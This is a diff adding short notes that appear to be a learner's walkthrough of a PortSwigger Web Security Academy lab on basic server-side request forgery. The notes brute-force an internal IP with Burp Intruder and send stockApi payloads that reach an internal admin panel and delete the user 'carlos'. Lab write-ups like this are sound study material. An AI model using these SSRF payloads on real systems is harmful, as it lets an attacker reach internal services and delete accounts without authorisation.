@@ -1,0 +1,11 @@
+Lab #02: Basic SSRF against another back-end system
+
+1. Check the stock page and send it to repeater tab.
+2. We need to find the another internal IP 
+3. Use Burp intruder to bruteforce the IP. 117 has 200 OK 
+stockApi=http://192.168.0.§1§:8080/admin
+4. send the request with stockApi=http%3a//192.168.0.117%3a8080/admin, select show response in browser.
+5. Copy the url for the deletion of carlos user
+https://0a060088042922d980a2ee75008000c2.web-security-academy.net/http://192.168.0.117:8080/admin/delete?username=carlos
+6. Send the request
+stockApi=http%3a//192.168.0.117%3a8080/admin/delete?username=carlos
